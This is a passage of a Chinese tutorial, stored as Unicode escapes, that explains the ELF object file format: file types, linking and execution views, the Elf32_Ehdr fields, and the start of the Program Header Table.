File\uff09\uff0c\u5305\u542b\u7531\u7f16\u8bd1\u5668\u751f\u6210\u7684\u4ee3\u7801\u4ee5\u53ca\u6570\u636e\u3002\u94fe\u63a5\u5668\u4f1a\u5c06\u5b83\u4e0e\u5176\u5b83\u76ee\u6807\u6587\u4ef6\u94fe\u63a5\u8d77\u6765\u4ece\u800c\u521b\u5efa\u53ef\u6267\u884c\u6587\u4ef6\u6216\u8005\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u3002\u5728 Linux \u7cfb\u7edf\u4e2d\uff0c\u8fd9\u79cd\u6587\u4ef6\u7684\u540e\u7f00\u4e00\u822c\u4e3a .o \u3002 \u53ef\u6267\u884c\u6587\u4ef6\uff08Executable File\uff09\uff0c\u5c31\u662f\u6211\u4eec\u901a\u5e38\u5728 Linux \u4e2d\u6267\u884c\u7684\u7a0b\u5e8f\u3002 \u5171\u4eab\u76ee\u6807\u6587\u4ef6\uff08Shared Object File\uff09\uff0c\u5305\u542b\u4ee3\u7801\u548c\u6570\u636e\uff0c\u8fd9\u79cd\u6587\u4ef6\u662f\u6211\u4eec\u6240\u79f0\u7684\u5e93\u6587\u4ef6\uff0c\u4e00\u822c\u4ee5 .so \u7ed3\u5c3e\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u5b83\u6709\u4ee5\u4e0b\u4e24\u79cd\u4f7f\u7528\u60c5\u666f \u94fe\u63a5\u5668\uff08Link eDitor, ld\uff09\u53ef\u80fd\u4f1a\u5904\u7406\u5b83\u548c\u5176\u5b83\u53ef\u91cd\u5b9a\u4f4d\u6587\u4ef6\u4ee5\u53ca\u5171\u4eab\u76ee\u6807\u6587\u4ef6\uff0c\u751f\u6210\u53e6\u5916\u4e00\u4e2a\u76ee\u6807\u6587\u4ef6\u3002 \u52a8\u6001\u94fe\u63a5\u5668\uff08Dynamic Linker\uff09\u5c06\u5b83\u4e0e\u53ef\u6267\u884c\u6587\u4ef6\u4ee5\u53ca\u5176\u5b83\u5171\u4eab\u76ee\u6807\u7ec4\u5408\u5728\u4e00\u8d77\u751f\u6210\u8fdb\u7a0b\u955c\u50cf\u3002 \u5173\u4e8eLink eDitor\u7684\u547d\u540d\uff0c https://en.wikipedia.org/wiki/GNU_linker \u76ee\u6807\u6587\u4ef6\u7531\u6c47\u7f16\u5668\u548c\u94fe\u63a5\u5668\u521b\u5efa\uff0c\u662f\u6587\u672c\u7a0b\u5e8f\u7684\u4e8c\u8fdb\u5236\u5f62\u5f0f\uff0c\u53ef\u4ee5\u76f4\u63a5\u5728\u5904\u7406\u5668\u4e0a\u8fd0\u884c\u3002\u90a3\u4e9b\u9700\u8981\u865a\u62df\u673a\u624d\u80fd\u591f\u6267\u884c\u7684\u7a0b\u5e8f(Java)\u4e0d\u5c5e\u4e8e\u8fd9\u4e00\u8303\u56f4\u3002 \u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u5173\u6ce8\u4e8e ELF \u7684\u6587\u4ef6\u683c\u5f0f\u3002 \u6587\u4ef6\u683c\u5f0f \u00b6 \u76ee\u6807\u6587\u4ef6\u65e2\u4f1a\u53c2\u4e0e\u7a0b\u5e8f\u94fe\u63a5\u53c8\u4f1a\u53c2\u4e0e\u7a0b\u5e8f\u6267\u884c\u3002\u51fa\u4e8e\u65b9\u4fbf\u6027\u548c\u6548\u7387\u8003\u8651\uff0c\u6839\u636e\u8fc7\u7a0b\u7684\u4e0d\u540c\uff0c\u76ee\u6807\u6587\u4ef6\u683c\u5f0f\u63d0\u4f9b\u4e86\u5176\u5185\u5bb9\u7684\u4e24\u79cd\u5e76\u884c\u89c6\u56fe\uff0c\u5982\u4e0b \u9996\u5148\uff0c\u6211\u4eec\u6765 \u5173\u6ce8\u4e00\u4e0b\u94fe\u63a5\u89c6\u56fe \u3002 \u6587\u4ef6\u5f00\u59cb\u5904\u662f ELF \u5934\u90e8\uff08 ELF Header \uff09\uff0c\u5b83\u7ed9\u51fa\u4e86\u6574\u4e2a\u6587\u4ef6\u7684\u7ec4\u7ec7\u60c5\u51b5\u3002 \u5982\u679c\u7a0b\u5e8f\u5934\u90e8\u8868\uff08Program Header Table\uff09\u5b58\u5728\u7684\u8bdd\uff0c\u5b83\u4f1a\u544a\u8bc9\u7cfb\u7edf\u5982\u4f55\u521b\u5efa\u8fdb\u7a0b\u3002\u7528\u4e8e\u751f\u6210\u8fdb\u7a0b\u7684\u76ee\u6807\u6587\u4ef6\u5fc5\u987b\u5177\u6709\u7a0b\u5e8f\u5934\u90e8\u8868\uff0c\u4f46\u662f\u91cd\u5b9a\u4f4d\u6587\u4ef6\u4e0d\u9700\u8981\u8fd9\u4e2a\u8868\u3002 \u8282\u533a\u90e8\u5206\u5305\u542b\u5728\u94fe\u63a5\u89c6\u56fe\u4e2d\u8981\u4f7f\u7528\u7684\u5927\u90e8\u5206\u4fe1\u606f\uff1a\u6307\u4ee4\u3001\u6570\u636e\u3001\u7b26\u53f7\u8868\u3001\u91cd\u5b9a\u4f4d\u4fe1\u606f\u7b49\u7b49\u3002 \u8282\u533a\u5934\u90e8\u8868\uff08Section Header Table\uff09\u5305\u542b\u4e86\u63cf\u8ff0\u6587\u4ef6\u8282\u533a\u7684\u4fe1\u606f\uff0c\u6bcf\u4e2a\u8282\u533a\u5728\u8868\u4e2d\u90fd\u6709\u4e00\u4e2a\u8868\u9879\uff0c\u4f1a\u7ed9\u51fa\u8282\u533a\u540d\u79f0\u3001\u8282\u533a\u5927\u5c0f\u7b49\u4fe1\u606f\u3002\u7528\u4e8e\u94fe\u63a5\u7684\u76ee\u6807\u6587\u4ef6\u5fc5\u987b\u6709\u8282\u533a\u5934\u90e8\u8868\uff0c\u5176\u5b83\u76ee\u6807\u6587\u4ef6\u5219\u65e0\u6240\u8c13\uff0c\u53ef\u4ee5\u6709\uff0c\u4e5f\u53ef\u4ee5\u6ca1\u6709\u3002 \u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e2a\u5173\u4e8e\u94fe\u63a5\u89c6\u56fe\u6bd4\u8f83\u5f62\u8c61\u7684\u5c55\u793a \u5bf9\u4e8e \u6267\u884c\u89c6\u56fe \u6765\u8bf4\uff0c\u5176\u4e3b\u8981\u7684\u4e0d\u540c\u70b9\u5728\u4e8e\u6ca1\u6709\u4e86section\uff0c\u800c\u6709\u4e86\u591a\u4e2asegment\u3002\u5176\u5b9e\u8fd9\u91cc\u7684 segment \u5927\u90fd\u662f\u6765\u6e90\u4e8e\u94fe\u63a5\u89c6\u56fe\u4e2d\u7684 section\u3002 \u6ce8\u610f: \u5c3d\u7ba1\u56fe\u4e2d\u662f\u6309\u7167 ELF \u5934\uff0c\u7a0b\u5e8f\u5934\u90e8\u8868\uff0c\u8282\u533a\uff0c\u8282\u533a\u5934\u90e8\u8868\u7684\u987a\u5e8f\u6392\u5217\u7684\u3002\u4f46\u5b9e\u9645\u4e0a\u9664\u4e86 ELF \u5934\u90e8\u8868\u4ee5\u5916\uff0c\u5176\u5b83\u90e8\u5206\u90fd\u6ca1\u6709\u4e25\u683c\u7684\u7684\u987a\u5e8f\u3002 \u6570\u636e\u5f62\u5f0f \u00b6 ELF \u6587\u4ef6\u683c\u5f0f\u652f\u6301 8 \u4f4d/32 \u4f4d\u4f53\u7cfb\u7ed3\u6784\u3002\u5f53\u7136\uff0c\u8fd9\u79cd\u683c\u5f0f\u662f\u53ef\u4ee5\u6269\u5c55\u7684\uff0c\u4e5f\u53ef\u4ee5\u652f\u6301\u66f4\u5c0f\u7684\u6216\u8005\u66f4\u5927\u4f4d\u6570\u7684\u5904\u7406\u5668\u67b6\u6784\u3002\u56e0\u6b64\uff0c\u76ee\u6807\u6587\u4ef6\u4f1a\u5305\u542b\u4e00\u4e9b\u63a7\u5236\u6570\u636e\uff0c\u8fd9\u90e8\u5206\u6570\u636e\u8868\u660e\u4e86\u76ee\u6807\u6587\u4ef6\u6240\u4f7f\u7528\u7684\u67b6\u6784\uff0c\u8fd9\u4e5f\u4f7f\u5f97\u5b83\u53ef\u4ee5\u88ab\u901a\u7528\u7684\u65b9\u5f0f\u6765\u8bc6\u522b\u548c\u89e3\u91ca\u3002\u76ee\u6807\u6587\u4ef6\u4e2d\u7684\u5176\u5b83\u6570\u636e\u91c7\u7528\u76ee\u7684\u5904\u7406\u5668\u7684\u683c\u5f0f\u8fdb\u884c\u7f16\u7801\uff0c\u4e0e\u5728\u4f55\u79cd\u673a\u5668\u4e0a\u521b\u5efa\u6ca1\u6709\u5173\u7cfb\u3002\u8fd9\u91cc\u5176\u5b9e\u60f3\u8868\u660e\u7684\u610f\u601d\u76ee\u6807\u6587\u4ef6\u53ef\u4ee5\u8fdb\u884c\u4ea4\u53c9\u7f16\u8bd1\uff0c\u6211\u4eec\u53ef\u4ee5\u5728 x86 \u5e73\u53f0\u751f\u6210 arm \u5e73\u53f0\u7684\u53ef\u6267\u884c\u4ee3\u7801\u3002 \u76ee\u6807\u6587\u4ef6\u4e2d\u7684\u6240\u6709\u6570\u636e\u7ed3\u6784\u90fd\u9075\u4ece\u201c\u81ea\u7136\u201d\u5927\u5c0f\u548c\u5bf9\u9f50\u89c4\u5219\u3002\u5982\u4e0b \u540d\u79f0 \u957f\u5ea6 \u5bf9\u9f50\u65b9\u5f0f \u7528\u9014 Elf32_Addr 4 4 \u65e0\u7b26\u53f7\u7a0b\u5e8f\u5730\u5740 Elf32_Half 2 2 \u65e0\u7b26\u53f7\u534a\u6574\u578b Elf32_Off 4 4 \u65e0\u7b26\u53f7\u6587\u4ef6\u504f\u79fb Elf32_Sword 4 4 \u6709\u7b26\u53f7\u5927\u6574\u578b Elf32_Word 4 4 \u65e0\u7b26\u53f7\u5927\u6574\u578b unsigned char 1 1 \u65e0\u7b26\u53f7\u5c0f\u6574\u578b \u5982\u679c\u5fc5\u8981\uff0c\u6570\u636e\u7ed3\u6784\u53ef\u4ee5\u5305\u542b\u663e\u5f0f\u5730\u8865\u9f50\u6765\u786e\u4fdd 4 \u5b57\u8282\u5bf9\u8c61\u6309 4 \u5b57\u8282\u5bf9\u9f50\uff0c\u5f3a\u5236\u6570\u636e\u7ed3\u6784\u7684\u5927\u5c0f\u662f 4 \u7684\u6574\u6570\u500d\u7b49\u7b49\u3002\u6570\u636e\u540c\u6837\u9002\u7528\u662f\u5bf9\u9f50\u7684\u3002\u56e0\u6b64\uff0c\u5305\u542b\u4e00\u4e2a Elf32_Addr \u7c7b\u578b\u6210\u5458\u7684\u7ed3\u6784\u4f53\u4f1a\u5728\u6587\u4ef6\u4e2d\u7684 4 \u5b57\u8282\u8fb9\u754c\u5904\u5bf9\u9f50\u3002 \u4e3a\u4e86\u5177\u6709\u53ef\u79fb\u690d\u6027\uff0cELF \u6587\u4ef6\u4e0d\u4f7f\u7528\u4f4d\u57df\u3002 \u5b57\u7b26\u8868\u793a \u00b6 \u5f85\u3002 \u6ce8\uff1a\u5728\u4e0b\u9762\u7684\u4ecb\u7ecd\u4e2d\uff0c\u6211\u4eec\u4ee5 32 \u4f4d\u4e3a\u4e3b\u8fdb\u884c\u4ecb\u7ecd\u3002 ELF Header \u00b6 ELF Header \u63cf\u8ff0\u4e86 ELF \u6587\u4ef6\u7684\u6982\u8981\u4fe1\u606f\uff0c\u5229\u7528\u8fd9\u4e2a\u6570\u636e\u7ed3\u6784\u53ef\u4ee5\u7d22\u5f15\u5230 ELF \u6587\u4ef6\u7684\u5168\u90e8\u4fe1\u606f\uff0c\u6570\u636e\u7ed3\u6784\u5982\u4e0b\uff1a #define EI_NIDENT 16 typedef struct { unsigned char e_ident [ EI_NIDENT ]; ELF32_Half e_type ; ELF32_Half e_machine ; ELF32_Word e_version ; ELF32_Addr e_entry ; ELF32_Off e_phoff ; ELF32_Off e_shoff ; ELF32_Word e_flags ; ELF32_Half e_ehsize ; ELF32_Half e_phentsize ; ELF32_Half e_phnum ; ELF32_Half e_shentsize ; ELF32_Half e_shnum ; ELF32_Half e_shstrndx ; } Elf32_Ehdr ; \u5176\u4e2d\u6bcf\u4e2a\u6210\u5458\u90fd\u662f e \u5f00\u5934\u7684\uff0c\u5b83\u4eec\u5e94\u8be5\u90fd\u662f ELF \u7684\u7f29\u5199\u3002\u6bcf\u4e2a\u6210\u5458\u5177\u4f53\u7684\u8bf4\u660e\u5982\u4e0b\u3002 e_ident \u00b6 \u6b63\u5982\u4e4b\u524d\u6240\u8bf4\uff0cELF \u63d0\u4f9b\u4e86\u4e00\u4e2a\u76ee\u6807\u6587\u4ef6\u6846\u67b6\uff0c\u4ee5\u4fbf\u4e8e\u652f\u6301\u591a\u79cd\u5904\u7406\u5668\uff0c\u591a\u79cd\u7f16\u7801\u683c\u5f0f\u7684\u673a\u5668\u3002\u8be5\u53d8\u91cf\u7ed9\u51fa\u4e86\u7528\u4e8e\u89e3\u7801\u548c\u89e3\u91ca\u6587\u4ef6\u4e2d\u4e0e\u673a\u5668\u65e0\u5173\u7684\u6570\u636e\u7684\u65b9\u5f0f\u3002\u8fd9\u4e2a\u6570\u7ec4\u5bf9\u4e8e\u4e0d\u540c\u7684\u4e0b\u6807\u7684\u542b\u4e49\u5982\u4e0b \u5b8f\u540d\u79f0 \u4e0b\u6807 \u76ee\u7684 EI_MAG0 0 \u6587\u4ef6\u6807\u8bc6 EI_MAG1 1 \u6587\u4ef6\u6807\u8bc6 EI_MAG2 2 \u6587\u4ef6\u6807\u8bc6 EI_MAG3 3 \u6587\u4ef6\u6807\u8bc6 EI_CLASS 4 \u6587\u4ef6\u7c7b EI_DATA 5 \u6570\u636e\u7f16\u7801 EI_VERSION 6 \u6587\u4ef6\u7248\u672c EI_PAD 7 \u8865\u9f50\u5b57\u8282\u5f00\u59cb\u5904 \u5176\u4e2d\uff0c e_ident[EI_MAG0] \u5230 e_ident[EI_MAG3] \uff0c\u5373\u6587\u4ef6\u7684\u59344\u4e2a\u5b57\u8282\uff0c\u88ab\u79f0\u4f5c\u201c\u9b54\u6570\u201d\uff0c\u6807\u8bc6\u8be5\u6587\u4ef6\u662f\u4e00\u4e2aELF\u76ee\u6807\u6587\u4ef6\u3002 \u81f3\u4e8e\u5f00\u5934\u4e3a\u4ec0\u4e48\u662f0x7f\uff0c\u5e76\u6ca1\u6709\u4ed4\u7ec6\u53bb\u67e5\u8fc7 \u3002 \u540d\u79f0 \u503c \u4f4d\u7f6e ELFMAG0 0x7f e_ident[EI_MAG0] ELFMAG1 \u2018E\u2019 e_ident[EI_MAG1] ELFMAG2 \u2018L\u2019 e_ident[EI_MAG2] ELFMAG3 \u2018F\u2019 e_ident[EI_MAG3] e_ident[EI_CLASS] \u4e3a e_ident[EI_MAG3] \u7684\u4e0b\u4e00\u4e2a\u5b57\u8282\uff0c\u6807\u8bc6\u6587\u4ef6\u7684\u7c7b\u578b\u6216\u5bb9\u91cf\u3002 \u540d\u79f0 \u503c \u610f\u4e49 ELFCLASSNONE 0 \u65e0\u6548\u7c7b\u578b ELFCLASS32 1 32\u4f4d\u6587\u4ef6 ELFCLASS64 2 64\u4f4d\u6587\u4ef6 ELF \u6587\u4ef6\u7684\u8bbe\u8ba1\u4f7f\u5f97\u5b83\u53ef\u4ee5\u5728\u591a\u79cd\u5b57\u8282\u957f\u5ea6\u7684\u673a\u5668\u4e4b\u95f4\u79fb\u690d\uff0c\u800c\u4e0d\u9700\u8981\u5f3a\u5236\u89c4\u5b9a\u673a\u5668\u7684\u6700\u957f\u5b57\u8282\u957f\u5ea6\u548c\u6700\u77ed\u5b57\u8282\u957f\u5ea6\u3002 ELFCLASS32 \u7c7b\u578b\u652f\u6301\u6587\u4ef6\u5927\u5c0f\u548c\u865a\u62df\u5730\u5740\u7a7a\u95f4\u4e0a\u9650\u4e3a 4GB \u7684\u673a\u5668\uff1b\u5b83\u4f7f\u7528\u4e0a\u8ff0\u5b9a\u4e49\u4e2d\u7684\u57fa\u672c\u7c7b\u578b\u3002 ELFCLASS64 \u7c7b\u578b\u7528\u4e8e 64 \u4f4d\u67b6\u6784\u3002 e_ident[EI_DATA] \u5b57\u8282\u7ed9\u51fa\u4e86\u76ee\u6807\u6587\u4ef6\u4e2d\u7684\u7279\u5b9a\u5904\u7406\u5668\u6570\u636e\u7684\u7f16\u7801\u65b9\u5f0f\u3002\u4e0b\u9762\u662f\u76ee\u524d\u5df2\u5b9a\u4e49\u7684\u7f16\u7801\uff1a \u540d\u79f0 \u503c \u610f\u4e49 ELFDATANONE 0 \u65e0\u6548\u6570\u636e\u7f16\u7801 ELFDATA2LSB 1 \u5c0f\u7aef ELFDATA2MSB 2 \u5927\u7aef \u5176\u5b83\u503c\u88ab\u4fdd\u7559\uff0c\u5728\u672a\u6765\u5fc5\u8981\u65f6\u5c06\u88ab\u8d4b\u4e88\u65b0\u7684\u7f16\u7801\u3002 \u6587\u4ef6\u6570\u636e\u7f16\u7801\u65b9\u5f0f\u8868\u660e\u4e86\u6587\u4ef6\u5185\u5bb9\u7684\u89e3\u6790\u65b9\u5f0f\u3002\u6b63\u5982\u4e4b\u524d\u6240\u8ff0\uff0c ELFCLASS32 \u7c7b\u578b\u6587\u4ef6\u4f7f\u7528\u4e86\u5177\u67091\uff0c2 \u548c 4 \u5b57\u8282\u7684\u53d8\u91cf\u7c7b\u578b\u3002\u5bf9\u4e8e\u5df2\u5b9a\u4e49\u7684\u4e0d\u540c\u7684\u7f16\u7801\u65b9\u5f0f\uff0c\u5176\u8868\u793a\u5982\u4e0b\u6240\u793a\uff0c\u5176\u4e2d\u5b57\u8282\u53f7\u5728\u5de6\u4e0a\u89d2\u3002 ELFDATA2LSB \u7f16\u7801\u4f7f\u7528\u8865\u7801\uff0c\u6700\u4f4e\u6709\u6548\u4f4d\uff08Least Significant Byte\uff09\u5360\u7528\u6700\u4f4e\u5730\u5740\u3002 ELFDATA2MSB \u7f16\u7801\u4f7f\u7528\u8865\u7801\uff0c\u6700\u9ad8\u6709\u6548\u4f4d\uff08Most Significant Byte\uff09\u5360\u7528\u6700\u4f4e\u5730\u5740\u3002 e_ident[EI_DATA] \u7ed9\u51fa\u4e86 ELF \u5934\u7684\u7248\u672c\u53f7\u3002\u76ee\u524d\u8fd9\u4e2a\u503c\u5fc5\u987b\u662f EV_CURRENT \uff0c\u5373\u4e4b\u524d\u5df2\u7ecf\u7ed9\u51fa\u7684 e_version \u3002 e_ident[EI_PAD] \u7ed9\u51fa\u4e86 e_ident \u4e2d\u672a\u4f7f\u7528\u5b57\u8282\u7684\u5f00\u59cb\u5730\u5740\u3002\u8fd9\u4e9b\u5b57\u8282\u88ab\u4fdd\u7559\u5e76\u7f6e\u4e3a0\uff1b\u5904\u7406\u76ee\u6807\u6587\u4ef6\u7684\u7a0b\u5e8f\u5e94\u8be5\u5ffd\u7565\u5b83\u4eec\u3002\u5982\u679c\u4e4b\u540e\u8fd9\u4e9b\u5b57\u8282\u88ab\u4f7f\u7528\uff0cEI_PAD\u7684\u503c\u5c31\u4f1a\u6539\u53d8\u3002 e_type \u00b6 e_type \u6807\u8bc6\u76ee\u6807\u6587\u4ef6\u7c7b\u578b\u3002 \u540d\u79f0 \u503c \u610f\u4e49 ET_NONE 0 \u65e0\u6587\u4ef6\u7c7b\u578b ET_REL 1 \u53ef\u91cd\u5b9a\u4f4d\u6587\u4ef6 ET_EXEC 2 \u53ef\u6267\u884c\u6587\u4ef6 ET_DYN 3 \u5171\u4eab\u76ee\u6807\u6587\u4ef6 ET_CORE 4 \u6838\u5fc3\u8f6c\u50a8\u6587\u4ef6 ET_LOPROC 0xff00 \u5904\u7406\u5668\u6307\u5b9a\u4e0b\u9650 ET_HIPROC 0xffff \u5904\u7406\u5668\u6307\u5b9a\u4e0a\u9650 \u867d\u7136\u6838\u5fc3\u8f6c\u50a8\u6587\u4ef6\u7684\u5185\u5bb9\u6ca1\u6709\u88ab\u8be6\u7ec6\u8bf4\u660e\uff0c\u4f46 ET_CORE \u8fd8\u662f\u88ab\u4fdd\u7559\u7528\u4e8e\u6807\u5fd7\u6b64\u7c7b\u6587\u4ef6\u3002\u4ece ET_LOPROC \u5230 ET_HIPROC (\u5305\u62ec\u8fb9\u754c)\u88ab\u4fdd\u7559\u7528\u4e8e\u5904\u7406\u5668\u6307\u5b9a\u7684\u573a\u666f\u3002\u5176\u5b83\u503c\u5728\u672a\u6765\u5fc5\u8981\u65f6\u53ef\u88ab\u8d4b\u4e88\u65b0\u7684\u76ee\u6807\u6587\u4ef6\u7c7b\u578b\u3002 e_machine \u00b6 \u8fd9\u4e00\u9879\u6307\u5b9a\u4e86\u5f53\u524d\u6587\u4ef6\u53ef\u4ee5\u8fd0\u884c\u7684\u673a\u5668\u67b6\u6784\u3002 \u540d\u79f0 \u503c \u610f\u4e49 EM_NONE 0 \u65e0\u673a\u5668\u7c7b\u578b EM_M32 1 AT&T WE 32100 EM_SPARC 2 SPARC EM_386 3 Intel 80386 EM_68K 4 Motorola 68000 EM_88K 5 Motorola 88000 EM_860 7 Intel 80860 EM_MIPS 8 MIPS RS3000 \u5176\u4e2d EM \u5e94\u8be5\u662f ELF Machine \u7684\u7b80\u5199\u3002 \u5176\u5b83\u503c\u88ab\u5728\u672a\u6765\u5fc5\u8981\u65f6\u7528\u4e8e\u65b0\u7684\u673a\u5668\u3002 \u6b64\u5916\uff0c\u7279\u5b9a\u5904\u7406\u5668\u7684ELF\u540d\u79f0\u4f7f\u7528\u673a\u5668\u540d\u79f0\u6765\u8fdb\u884c\u533a\u5206\uff0c\u4e00\u822c\u6807\u5fd7\u4f1a\u6709\u4e2a\u524d\u7f00 EF_ \uff08ELF Flag\uff09\u3002\u4f8b\u5982\uff0c\u5728 EM_XYZ \u673a\u5668\u4e0a\u540d\u53eb WIDGET \u7684\u6807\u5fd7\u5c06\u88ab\u79f0\u4e3a EF_XYZ_WIDGET \u3002 e_version \u00b6 \u6807\u8bc6\u76ee\u6807\u6587\u4ef6\u7684\u7248\u672c\u3002 \u540d\u79f0 \u503c \u610f\u4e49 EV_NONE 0 \u65e0\u6548\u7248\u672c EV_CURRENT 1 \u5f53\u524d\u7248\u672c 1 \u8868\u793a\u521d\u59cb\u6587\u4ef6\u683c\u5f0f\uff1b\u672a\u6765\u6269\u5c55\u65b0\u7684\u7248\u672c\u7684\u65f6\u5019(extensions)\u5c06\u4f7f\u7528\u66f4\u5927\u7684\u6570\u5b57\u3002\u867d\u7136\u5728\u4e0a\u9762\u503c EV_CURRENT \u4e3a1\uff0c\u4f46\u662f\u4e3a\u4e86\u53cd\u6620\u5f53\u524d\u7248\u672c\u53f7\uff0c\u5b83\u53ef\u80fd\u4f1a\u6539\u53d8\uff0c \u6bd4\u5982ELF\u5230\u73b0\u5728\u4e5f\u5c31\u662f1.2\u7248\u672c\u3002 e_entry \u00b6 \u8fd9\u4e00\u9879\u4e3a\u7cfb\u7edf\u8f6c\u4ea4\u63a7\u5236\u6743\u7ed9 ELF \u4e2d\u76f8\u5e94\u4ee3\u7801\u7684\u865a\u62df\u5730\u5740\u3002\u5982\u679c\u6ca1\u6709\u76f8\u5173\u7684\u5165\u53e3\u9879\uff0c\u5219\u8fd9\u4e00\u9879\u4e3a0\u3002 e_phoff \u00b6 \u8fd9\u4e00\u9879\u7ed9\u51fa \u7a0b\u5e8f\u5934\u90e8\u8868 \u5728\u6587\u4ef6\u4e2d\u7684\u5b57\u8282\u504f\u79fb\uff08 Program Header table OFFset \uff09\u3002\u5982\u679c\u6587\u4ef6\u4e2d\u6ca1\u6709\u7a0b\u5e8f\u5934\u90e8\u8868\uff0c\u5219\u4e3a0\u3002 e_shoff \u00b6 \u8fd9\u4e00\u9879\u7ed9\u51fa \u8282\u5934\u8868 \u5728\u6587\u4ef6\u4e2d\u7684\u5b57\u8282\u504f\u79fb\uff08 Section Header table OFFset \uff09\u3002\u5982\u679c\u6587\u4ef6\u4e2d\u6ca1\u6709\u8282\u5934\u8868\uff0c\u5219\u4e3a0\u3002 e_flags \u00b6 \u8fd9\u4e00\u9879\u7ed9\u51fa\u6587\u4ef6\u4e2d\u4e0e\u7279\u5b9a\u5904\u7406\u5668\u76f8\u5173\u7684\u6807\u5fd7\uff0c\u8fd9\u4e9b\u6807\u5fd7\u547d\u540d\u683c\u5f0f\u4e3a EF_machine_flag \u3002 e_ehsize \u00b6 \u8fd9\u4e00\u9879\u7ed9\u51fa ELF \u6587\u4ef6\u5934\u90e8\u7684\u5b57\u8282\u957f\u5ea6\uff08ELF Header Size\uff09\u3002 e_phentsize \u00b6 \u8fd9\u4e00\u9879\u7ed9\u51fa\u7a0b\u5e8f\u5934\u90e8\u8868\u4e2d\u6bcf\u4e2a\u8868\u9879\u7684\u5b57\u8282\u957f\u5ea6\uff08 Program Header ENTry SIZE \uff09\u3002\u6bcf\u4e2a\u8868\u9879\u7684\u5927\u5c0f\u76f8\u540c\u3002 e_phnum \u00b6 \u8fd9\u4e00\u9879\u7ed9\u51fa\u7a0b\u5e8f\u5934\u90e8\u8868\u7684\u9879\u6570\uff08 Program Header entry NUMber \uff09\u3002\u56e0\u6b64\uff0c e_phnum \u4e0e e_phentsize \u7684\u4e58\u79ef\u5373\u4e3a\u7a0b\u5e8f\u5934\u90e8\u8868\u7684\u5b57\u8282\u957f\u5ea6\u3002\u5982\u679c\u6587\u4ef6\u4e2d\u6ca1\u6709\u7a0b\u5e8f\u5934\u90e8\u8868\uff0c\u5219\u8be5\u9879\u503c\u4e3a0\u3002 e_shentsize \u00b6 \u8fd9\u4e00\u9879\u7ed9\u51fa\u8282\u5934\u7684\u5b57\u8282\u957f\u5ea6\uff08 Section Header ENTry SIZE \uff09\u3002\u4e00\u4e2a\u8282\u5934\u662f\u8282\u5934\u8868\u4e2d\u7684\u4e00\u9879\uff1b\u8282\u5934\u8868\u4e2d\u6240\u6709\u9879\u5360\u636e\u7684\u7a7a\u95f4\u5927\u5c0f\u76f8\u540c\u3002 e_shnum \u00b6 \u8fd9\u4e00\u9879\u7ed9\u51fa\u8282\u5934\u8868\u4e2d\u7684\u9879\u6570\uff08 Section Header NUMber \uff09\u3002\u56e0\u6b64\uff0c e_shnum \u4e0e e_shentsize \u7684\u4e58\u79ef\u5373\u4e3a\u8282\u5934\u8868\u7684\u5b57\u8282\u957f\u5ea6\u3002\u5982\u679c\u6587\u4ef6\u4e2d\u6ca1\u6709\u8282\u5934\u8868\uff0c\u5219\u8be5\u9879\u503c\u4e3a0\u3002 e_shstrndx \u00b6 \u8fd9\u4e00\u9879\u7ed9\u51fa\u8282\u5934\u8868\u4e2d\u4e0e\u8282\u540d\u5b57\u7b26\u4e32\u8868\u76f8\u5173\u7684\u8868\u9879\u7684\u7d22\u5f15\u503c\uff08 Section Header table InDeX related with section name STRing table \uff09\u3002\u5982\u679c\u6587\u4ef6\u4e2d\u6ca1\u6709\u8282\u540d\u5b57\u7b26\u4e32\u8868\uff0c\u5219\u8be5\u9879\u503c\u4e3a SHN_UNDEF \u3002\u5173\u4e8e\u7ec6\u8282\u7684\u4ecb\u7ecd\uff0c\u8bf7\u53c2\u8003\u540e\u9762\u7684\u201c\u8282\u201d\u548c\u201c\u5b57\u7b26\u4e32\u8868\u201d\u90e8\u5206\u3002 Program Header Table \u00b6 \u6982\u8ff0 \u00b6 Program Header Table \u662f\u4e00\u4e2a\u7ed3\u6784\u4f53\u6570\u7ec4\uff0c\u6bcf\u4e00\u4e2a\u5143\u7d20\u7684\u7c7b\u578b\u662f Elf32_Phdr \uff0c\u63cf\u8ff0\u4e86\u4e00\u4e2a\u6bb5\u6216\u8005\u5176\u5b83\u7cfb\u7edf\u5728\u51c6\u5907\u7a0b\u5e8f\u6267\u884c\u65f6\u6240\u9700\u8981\u7684\u4fe1\u606f\u3002\u5176\u4e2d\uff0cELF \u5934\u4e2d\u7684 e_phentsize \u548c e_phnum \u6307\u5b9a\u4e86\u8be5\u6570\u7ec4\u6bcf\u4e2a\u5143\u7d20\u7684\u5927\u5c0f\u4ee5\u53ca\u5143\u7d20\u4e2a\u6570\u3002\u4e00\u4e2a\u76ee\u6807\u6587\u4ef6\u7684\u6bb5\u5305\u542b\u4e00\u4e2a\u6216\u8005\u591a\u4e2a\u8282\u3002 \u7a0b\u5e8f\u7684\u5934\u90e8\u53ea\u6709\u5bf9\u4e8e\u53ef\u6267\u884c\u6587\u4ef6\u548c\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u6709\u610f\u4e49\u3002 \u53ef\u4ee5\u8bf4\uff0cProgram Header Table \u5c31\u662f\u4e13\u95e8\u4e3a ELF \u6587\u4ef6\u8fd0\u884c\u65f6\u4e2d\u7684\u6bb5\u6240\u51c6\u5907\u7684\u3002 Elf32_Phdr \u7684\u6570\u636e\u7ed3\u6784\u5982\u4e0b typedef struct { ELF32_Word p_type ; ELF32_Off p_offset ; ELF32_Addr p_vaddr ; ELF32_Addr p_paddr ; ELF32_Word p_filesz ; ELF32_Word p_memsz ; ELF32_Word p_flags ; ELF32_Word p_align ; } Elf32_Phdr ; \u6bcf\u4e2a\u5b57\u6bb5\u7684\u8bf4\u660e\u5982\u4e0b \u5b57\u6bb5 \u8bf4\u660e p_type \u8be5\u5b57\u6bb5\u4e3a\u6bb5\u7684\u7c7b\u578b\uff0c\u6216\u8005\u8868\u660e\u4e86\u8be5\u7ed3\u6784\u7684\u76f8\u5173\u4fe1\u606f\u3002 p_offset \u8be5\u5b57\u6bb5\u7ed9\u51fa\u4e86\u4ece\u6587\u4ef6\u5f00\u59cb\u5230\u8be5\u6bb5\u5f00\u5934\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u7684\u504f\u79fb\u3002 p_vaddr 